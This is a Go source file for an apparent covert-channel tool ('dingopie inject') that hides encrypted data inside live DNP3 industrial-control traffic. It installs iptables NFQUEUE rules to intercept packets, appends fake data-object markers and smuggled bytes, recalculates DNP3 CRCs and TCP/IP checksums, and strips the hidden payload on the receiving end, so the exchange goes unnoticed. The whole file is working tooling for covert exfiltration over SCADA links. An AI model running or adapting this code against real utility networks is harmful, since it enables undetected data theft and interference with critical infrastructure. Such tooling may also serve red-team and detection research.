//go:build !windows

// Package inject sends data on top of an existing DNP3 connection. The sender waits for outgoing or transiting
// packets, and modifies it, adding an invalid data object to mark the start of its message, and then as many bytes of
// data as can fit in the frame. On the other side, the receiver scans incoming messages for these special data
// objects, and strips them and any following data before forwarding the packet to its intended destination. The
// specific data object that is added can take one of three forms, signaling the size of data to follow, send data,
// or disconnect (all data sent). This scheme is identical regardless of the direction: both master and outstation
// append the same data objects.
//
// The sequence of messages is as follows:
//
//		(sender)-- G0V0QFA + size -->(receiver)	Initiate connection
//	Loop:
//		(sender)-- G0V0QFC + data -->(receiver)	Send Data
//		...
//	End:
//		(sender)-- G0V0QFD        -->(receiver)	Disconnect
//
// In each instance above, a legitimate DNP3 messages is coming into the sender, being modified with the extra data,
// and then being forwarded onto the receiver which strips this data. The sender and receiver can either intercept
// packets as they leave a device (i.e. running on anoutstation or master), or they can run on network infrastructure
// that carries DNP3 traffic. In the second case, dingopie inject can even multiplex its data transfer over many DNP3
// connections to increase the throughput. Although in this instance, TCP out-of-order fuckery may impact reliability.
package inject

import (
	"bytes"
	"context"
	"encoding/binary"
	"errors"
	"fmt"
	"io"
	"math"
	"os"
	"os/signal"
	"strconv"
	"syscall"
	"time"

	"github.com/coreos/go-iptables/iptables"
	nfqueue "github.com/florianl/go-nfqueue"
	"github.com/nblair2/dingopie/internal"
	"github.com/nblair2/go-dnp3/dnp3"
)

const (
	injectRuleNumber int    = 1
	injectQueue      uint16 = 1

	dnp3HeaderLen  = 10 // 8-byte DL header + 2-byte CRC
	maxDNP3Length  = 255
	markerLen      = 3
	sizePayloadLen = 4 // big-endian uint32
)

var (
	sizeMarker   = []byte{0x00, 0x00, 0xFA}
	injectMarker = []byte{0x00, 0x00, 0xFC}
	endMarker    = []byte{0x00, 0x00, 0xFD}
)

func inject(
	out io.Writer,
	rule *FirewallRule,
	fwdFunc func(*forwardInfo) error,
	done chan struct{},
) error {
	sigChan := make(chan os.Signal, 1)

	signal.Notify(sigChan, syscall.SIGINT)
	defer signal.Stop(sigChan)

	err := addFirewallRule(rule)
	if err != nil {
		return fmt.Errorf("error creating firewall rule: %w", err)
	}

	defer deleteFirewallRule(rule)

	fmt.Fprintf(out, ">> Intercepting traffic\n")

	pktChan := make(chan forwardInfo, 1)

	go newNFQueueToChan(injectQueue, pktChan)
	go newChanToFunc(pktChan, fwdFunc)

	select {
	case <-sigChan:
	case <-done:
	}

	return nil
}

type forwardInfo struct {
	payload      []byte
	responseChan chan []byte
}

func newNFQueueToChan(que uint16, forward chan forwardInfo) {
	//nolint: exhaustruct // Use defaults
	config := nfqueue.Config{
		NfQueue:      que,
		MaxPacketLen: 0xFFFF,
		MaxQueueLen:  0xFF,
		Copymode:     nfqueue.NfQnlCopyPacket,
		WriteTimeout: time.Second,
	}

	nf, err := nfqueue.Open(&config)
	if err != nil {
		return
	}

	defer nf.Close()

	fwdFunc := func(a nfqueue.Attribute) int {
		response := make(chan []byte, 1)
		fwd := forwardInfo{
			payload:      *a.Payload,
			responseChan: response,
		}

		forward <- fwd

		resp := <-response

		err = nf.SetVerdictModPacket(*a.PacketID, nfqueue.NfAccept, resp)
		if err != nil {
			fmt.Printf("Error setting verdict: %v\n", err)
		}

		return 0
	}

	errFunc := func(e error) int { return 1 }

	err = nf.RegisterWithErrorFunc(context.Background(), fwdFunc, errFunc)
	if err != nil {
		return
	}

	// Block until the nfqueue loop exits on error or shutdown.
	select {}
}

func newChanToFunc(forward chan forwardInfo, fwdFunc func(*forwardInfo) error) {
	for fwd := range forward {
		err := fwdFunc(&fwd)
		if err != nil {
			fmt.Printf("Error in forward function: %v\n", err)
		}

		fwd.responseChan <- fwd.payload
	}
}

// FirewallRule holds the parameters for a single iptables NFQUEUE rule.
type FirewallRule struct {
	table       string
	chain       string
	number      int
	que         uint16
	source      string
	destination string
	srcPort     int
	destPort    int
}

func newFirewallRule(
	table, chain string,
	source, destination string,
	srcPort, destPort int,
) *FirewallRule {
	return &FirewallRule{
		table:       table,
		chain:       chain,
		number:      injectRuleNumber,
		que:         injectQueue,
		source:      source,
		destination: destination,
		srcPort:     srcPort,
		destPort:    destPort,
	}
}

// newSendRule intercepts packets leaving this host (POSTROUTING).
func newSendRule(local, remote string, localPort, remotePort int) *FirewallRule {
	return newFirewallRule("mangle", "POSTROUTING", local, remote, localPort, remotePort)
}

// newRecvRule intercepts packets arriving at this host (PREROUTING).
func newRecvRule(local, remote string, localPort, remotePort int) *FirewallRule {
	return newFirewallRule("mangle", "PREROUTING", remote, local, remotePort, localPort)
}

// ToArgs converts the rule into iptables argument strings.
func (r *FirewallRule) ToArgs() []string {
	var args []string

	if r.source != "" {
		args = append(args, "--source", r.source)
	}

	if r.destination != "" {
		args = append(args, "--destination", r.destination)
	}

	args = append(args, "--protocol", "tcp")

	if r.srcPort != 0 {
		args = append(args, "--sport", strconv.Itoa(r.srcPort))
	}

	if r.destPort != 0 {
		args = append(args, "--dport", strconv.Itoa(r.destPort))
	}

	args = append(args, "--jump", "NFQUEUE", "--queue-num", strconv.FormatUint(uint64(r.que), 10))

	return args
}

func addFirewallRule(rule *FirewallRule) error {
	ipt, err := iptables.New()
	if err != nil {
		return fmt.Errorf("failed to create iptables instance: %w", err)
	}

	err = ipt.Insert(rule.table, rule.chain, rule.number, rule.ToArgs()...)
	if err != nil {
		return fmt.Errorf("failed to insert iptables rule: %w", err)
	}

	return nil
}

func deleteFirewallRule(rule *FirewallRule) error {
	ipt, err := iptables.New()
	if err != nil {
		return fmt.Errorf("failed to create iptables instance: %w", err)
	}

	err = ipt.DeleteIfExists(rule.table, rule.chain, rule.ToArgs()...)
	if err != nil {
		return fmt.Errorf("failed to delete iptables rule: %w", err)
	}

	return nil
}

// ==================================================================
// Packet manipulation helpers
// ==================================================================

// findDNP3InIPPacket parses a raw IPv4 packet and returns the IP header length
// and TCP header length. Returns error if the packet is not IPv4/TCP or does
// not carry a DNP3 frame (magic bytes 0x05 0x64).
func findDNP3InIPPacket(pkt []byte) (int, int, error) {
	if len(pkt) < 20 {
		return 0, 0, errors.New("packet too short for IPv4 header")
	}

	if pkt[0]>>4 != 4 {
		return 0, 0, errors.New("not an IPv4 packet")
	}

	if pkt[9] != 6 {
		return 0, 0, errors.New("not a TCP packet")
	}

	ipHdrLen := int(pkt[0]&0x0F) * 4
	if len(pkt) < ipHdrLen+20 {
		return 0, 0, errors.New("packet too short for TCP header")
	}

	tcpHdrLen := int(pkt[ipHdrLen+12]>>4) * 4
	dnp3Start := ipHdrLen + tcpHdrLen

	if len(pkt) < dnp3Start+2 {
		return 0, 0, errors.New("packet too short for DNP3 magic bytes")
	}

	if pkt[dnp3Start] != 0x05 || pkt[dnp3Start+1] != 0x64 {
		return 0, 0, errors.New("DNP3 magic bytes not found")
	}

	return ipHdrLen, tcpHdrLen, nil
}

// calcIPChecksum computes the ones-complement 16-bit checksum over an IP header.
func calcIPChecksum(hdr []byte) uint16 {
	var sum uint32

	for i := 0; i+1 < len(hdr); i += 2 {
		sum += uint32(hdr[i])<<8 | uint32(hdr[i+1])
	}

	if len(hdr)%2 != 0 {
		sum += uint32(hdr[len(hdr)-1]) << 8
	}

	for sum>>16 != 0 {
		sum = (sum & 0xFFFF) + (sum >> 16)
	}

	return ^uint16(sum)
}

// calcTCPChecksum computes the TCP checksum using the IPv4 pseudo-header.
func calcTCPChecksum(pkt []byte, ipHdrLen int) uint16 {
	tcpSeg := pkt[ipHdrLen:]
	tcpLen := uint16(len(tcpSeg)) //nolint:gosec // G115: TCP length bounded by IPv4 max (65535)

	// pseudo-header: src IP, dst IP, zero, proto=6, TCP length
	pseudo := make([]byte, 12)
	copy(pseudo[0:4], pkt[12:16]) // source IP
	copy(pseudo[4:8], pkt[16:20]) // dest IP
	pseudo[8] = 0
	pseudo[9] = 6
	binary.BigEndian.PutUint16(pseudo[10:], tcpLen)

	var sum uint32

	for i := 0; i+1 < len(pseudo); i += 2 {
		sum += uint32(pseudo[i])<<8 | uint32(pseudo[i+1])
	}

	for i := 0; i+1 < len(tcpSeg); i += 2 {
		sum += uint32(tcpSeg[i])<<8 | uint32(tcpSeg[i+1])
	}

	if len(tcpSeg)%2 != 0 {
		sum += uint32(tcpSeg[len(tcpSeg)-1]) << 8
	}

	for sum>>16 != 0 {
		sum = (sum & 0xFFFF) + (sum >> 16)
	}

	return ^uint16(sum)
}

// rebuildChecksums updates the IP total-length, IP checksum, and TCP checksum
// after the packet has been resized.
func rebuildChecksums(pkt []byte, ipHdrLen int) {
	//nolint:gosec // G115: pkt bounded by nfqueue MaxPacketLen (0xFFFF)
	binary.BigEndian.PutUint16(pkt[2:], uint16(len(pkt)))
	pkt[10] = 0
	pkt[11] = 0
	cs := calcIPChecksum(pkt[:ipHdrLen])
	binary.BigEndian.PutUint16(pkt[10:], cs)

	pkt[ipHdrLen+16] = 0
	pkt[ipHdrLen+17] = 0
	tcs := calcTCPChecksum(pkt, ipHdrLen)
	binary.BigEndian.PutUint16(pkt[ipHdrLen+16:], tcs)
}

// buildDNP3Frame assembles a DNP3 frame from the raw transport+application
// bytes and the original header prefix (bytes 0-7 of the DNP3 header).
func buildDNP3Frame(hdrPrefix []byte, rawPayload []byte) []byte {
	newDataBlocks := dnp3.InsertDNP3CRCs(rawPayload)
	//nolint:gosec // G115: rawPayload length bounded by maxDNP3Length (255)
	newLength := byte(5 + len(rawPayload))

	newHdr := make([]byte, 8)
	copy(newHdr, hdrPrefix[:8])
	newHdr[2] = newLength

	crc := dnp3.CalculateDNP3CRC(newHdr)

	frame := make([]byte, 0, 8+len(crc)+len(newDataBlocks))
	frame = append(frame, newHdr...)
	frame = append(frame, crc...)
	frame = append(frame, newDataBlocks...)

	return frame
}

// injectIntoPacket appends marker+covertData to the DNP3 application payload
// within the raw IP packet. Returns the modified packet and how many covert
// bytes were consumed. Returns the original packet unchanged (consumed=0) if
// the packet is not IPv4/TCP/DNP3 or if there is no room.
func injectIntoPacket(pkt, covertData, marker []byte) ([]byte, int, error) {
	ipHdrLen, tcpHdrLen, err := findDNP3InIPPacket(pkt)
	if err != nil {
		return pkt, 0, nil //nolint:nilerr // non-DNP3 packets pass through silently
	}

	dnp3Start := ipHdrLen + tcpHdrLen
	if len(pkt) < dnp3Start+dnp3HeaderLen {
		return pkt, 0, nil
	}

	lengthByte := int(pkt[dnp3Start+2])
	available := maxDNP3Length - lengthByte

	if available <= markerLen {
		return pkt, 0, nil
	}

	_, rawPayload, err := dnp3.RemoveDNP3CRCs(pkt[dnp3Start+dnp3HeaderLen:])
	if err != nil {
		return pkt, 0, fmt.Errorf("RemoveDNP3CRCs: %w", err)
	}

	toSend := min(len(covertData), available-markerLen)

	rawPayload = append(rawPayload, marker...)
	if toSend > 0 {
		rawPayload = append(rawPayload, covertData[:toSend]...)
	}

	newFrame := buildDNP3Frame(pkt[dnp3Start:], rawPayload)

	newPkt := make([]byte, dnp3Start+len(newFrame))
	copy(newPkt, pkt[:dnp3Start])
	copy(newPkt[dnp3Start:], newFrame)

	rebuildChecksums(newPkt, ipHdrLen)

	return newPkt, toSend, nil
}

// markerType classifies what was found in a packet's DNP3 application payload.
type markerType int

const (
	markerNone markerType = iota
	markerSize
	markerData
	markerEnd
)

// extractFromPacket scans the DNP3 application payload for a covert marker.
// Returns the marker type, bytes after the marker, and a cleaned packet with
// the marker and everything after it removed. Returns markerNone with the
// original packet if no marker is found.
func extractFromPacket(pkt []byte) (markerType, []byte, []byte, error) {
	ipHdrLen, tcpHdrLen, err := findDNP3InIPPacket(pkt)
	if err != nil {
		return markerNone, nil, pkt, nil //nolint:nilerr // non-DNP3 passes through
	}

	dnp3Start := ipHdrLen + tcpHdrLen
	if len(pkt) < dnp3Start+dnp3HeaderLen {
		return markerNone, nil, pkt, nil
	}

	_, rawPayload, err := dnp3.RemoveDNP3CRCs(pkt[dnp3Start+dnp3HeaderLen:])
	if err != nil {
		return markerNone, nil, pkt, fmt.Errorf("RemoveDNP3CRCs: %w", err)
	}

	// Scan for marker at each byte offset.
	var kind markerType

	markerOffset := -1

	for i := 0; i+markerLen <= len(rawPayload); i++ {
		triplet := rawPayload[i : i+markerLen]

		if bytes.Equal(triplet, sizeMarker) {
			kind = markerSize
			markerOffset = i

			break
		}

		if bytes.Equal(triplet, injectMarker) {
			kind = markerData
			markerOffset = i

			break
		}

		if bytes.Equal(triplet, endMarker) {
			kind = markerEnd
			markerOffset = i

			break
		}
	}

	if markerOffset < 0 {
		return markerNone, nil, pkt, nil
	}

	payload := rawPayload[markerOffset+markerLen:]
	cleanedRaw := rawPayload[:markerOffset]

	newFrame := buildDNP3Frame(pkt[dnp3Start:], cleanedRaw)

	cleanedPkt := make([]byte, dnp3Start+len(newFrame))
	copy(cleanedPkt, pkt[:dnp3Start])
	copy(cleanedPkt[dnp3Start:], newFrame)

	rebuildChecksums(cleanedPkt, ipHdrLen)

	return kind, payload, cleanedPkt, nil
}

// ==================================================================
// Forward function constructors
// ==================================================================

// trySendSizePacket attempts to inject the encrypted size into fwd. Returns true if injected,
// false if the packet has no room yet or is not DNP3.
func trySendSizePacket(fwd *forwardInfo, encSize []byte) (bool, error) {
	ipHdrLen, tcpHdrLen, err := findDNP3InIPPacket(fwd.payload)
	if err != nil {
		return false, nil //nolint:nilerr // non-DNP3 packets pass through silently
	}

	dnp3Start := ipHdrLen + tcpHdrLen
	if len(fwd.payload) < dnp3Start+3 {
		return false, nil
	}

	available := maxDNP3Length - int(fwd.payload[dnp3Start+2])
	if available < markerLen+sizePayloadLen {
		return false, nil // not enough room, wait for next packet
	}

	newPkt, _, err := injectIntoPacket(fwd.payload, encSize, sizeMarker)
	if err != nil {
		return false, fmt.Errorf("injectIntoPacket (size): %w", err)
	}

	fwd.payload = newPkt

	return true, nil
}

//nolint:funlen // multi-phase send state machine: size → data chunks → end marker
func newSendFunc(
	out io.Writer,
	data []byte,
	key string,
	done chan struct{},
) (func(*forwardInfo) error, error) {
	if uint64(len(data)) > math.MaxUint32 {
		return nil, fmt.Errorf(
			"data length %d exceeds maximum of %d bytes", len(data), uint32(math.MaxUint32),
		)
	}

	//nolint:gosec // G115: len guarded by math.MaxUint32 check above
	originalLen := uint32(len(data))

	stream := internal.NewCipherStream(key)

	encSize := make([]byte, sizePayloadLen)
	binary.BigEndian.PutUint32(encSize, originalLen)
	stream.XORKeyStream(encSize, encSize)

	enc := make([]byte, len(data))
	stream.XORKeyStream(enc, data)

	bar := internal.NewProgressBar(out, int(originalLen), "\tSending:\t")

	sizeSent := false
	remaining := enc
	isDone := false

	return func(fwd *forwardInfo) error {
		if isDone {
			return nil
		}

		if !sizeSent {
			sent, err := trySendSizePacket(fwd, encSize)
			if err != nil {
				return err
			}

			sizeSent = sent

			return nil
		}

		if len(remaining) > 0 {
			newPkt, consumed, err := injectIntoPacket(fwd.payload, remaining, injectMarker)
			if err != nil {
				return fmt.Errorf("injectIntoPacket (data): %w", err)
			}

			if consumed > 0 {
				fwd.payload = newPkt
				remaining = remaining[consumed:]
				bar.Add(consumed)
			}

			return nil
		}

		// All data sent — inject end marker and terminate.
		newPkt, _, err := injectIntoPacket(fwd.payload, nil, endMarker)
		if err != nil {
			return fmt.Errorf("injectIntoPacket (end): %w", err)
		}

		fwd.payload = newPkt
		isDone = true

		bar.Finish()
		fmt.Fprintf(out, ">> All data sent, removing firewall rule\n")
		close(done)

		return nil
	}, nil
}

//nolint:funlen // multi-phase receive state machine: size → data chunks → end marker
func newRecvFunc(
	out io.Writer,
	key string,
	result *[]byte,
	done chan struct{},
) func(*forwardInfo) error {
	stream := internal.NewCipherStream(key)

	var originalLen uint32

	gotSize := false

	var collected []byte

	var bar interface {
		Add(n int) error
		Finish() error
	}

	return func(fwd *forwardInfo) error {
		kind, payload, cleaned, err := extractFromPacket(fwd.payload)
		if err != nil {
			return fmt.Errorf("extractFromPacket: %w", err)
		}

		fwd.payload = cleaned

		switch kind { //nolint:exhaustive // markerNone is a no-op pass-through
		case markerSize:
			if len(payload) < sizePayloadLen {
				return fmt.Errorf("size marker payload too short: %d bytes", len(payload))
			}

			dec := make([]byte, sizePayloadLen)
			stream.XORKeyStream(dec, payload[:sizePayloadLen])
			originalLen = binary.BigEndian.Uint32(dec)
			gotSize = true
			bar = internal.NewProgressBar(out, int(originalLen), "\tReceiving:\t")

		case markerData:
			dec := make([]byte, len(payload))
			stream.XORKeyStream(dec, payload)
			collected = append(collected, dec...)

			if bar != nil {
				bar.Add(len(dec))
			}

		case markerEnd:
			received := collected
			//nolint:gosec // G115: len bounded by originalLen (uint32)
			if gotSize && uint32(len(received)) > originalLen {
				received = received[:originalLen]
			}

			*result = received

			if bar != nil {
				bar.Finish()
			}

			fmt.Fprintf(out, ">> Data receive complete, removing firewall rule\n")
			close(done)
		}

		return nil
	}
}

// ==================================================================
// Exported functions
// ==================================================================

func ClientInjectReceive(
	out io.Writer,
	localAddr, remoteAddr string,
	localPort, remotePort int,
	key string,
) ([]byte, error) {
	var received []byte

	done := make(chan struct{})
	rule := newRecvRule(localAddr, remoteAddr, localPort, remotePort)
	err := inject(out, rule, newRecvFunc(out, key, &received, done), done)

	return received, err
}

func ServerInjectSend(
	out io.Writer,
	localAddr, remoteAddr string,
	localPort, remotePort int,
	key string,
	data []byte,
) error {
	done := make(chan struct{})

	sendFn, err := newSendFunc(out, data, key, done)
	if err != nil {
		return err
	}

	rule := newSendRule(localAddr, remoteAddr, localPort, remotePort)

	return inject(out, rule, sendFn, done)
}

func ClientInjectSend(
	out io.Writer,
	localAddr, remoteAddr string,
	localPort, remotePort int,
	key string,
	data []byte,
) error {
	done := make(chan struct{})

	sendFn, err := newSendFunc(out, data, key, done)
	if err != nil {
		return err
	}

	rule := newSendRule(localAddr, remoteAddr, localPort, remotePort)

	return inject(out, rule, sendFn, done)
}

func ServerInjectReceive(
	out io.Writer,
	localAddr, remoteAddr string,
	localPort, remotePort int,
	key string,
) ([]byte, error) {
	var received []byte

	done := make(chan struct{})
	rule := newRecvRule(localAddr, remoteAddr, localPort, remotePort)
	err := inject(out, rule, newRecvFunc(out, key, &received, done), done)

	return received, err
}
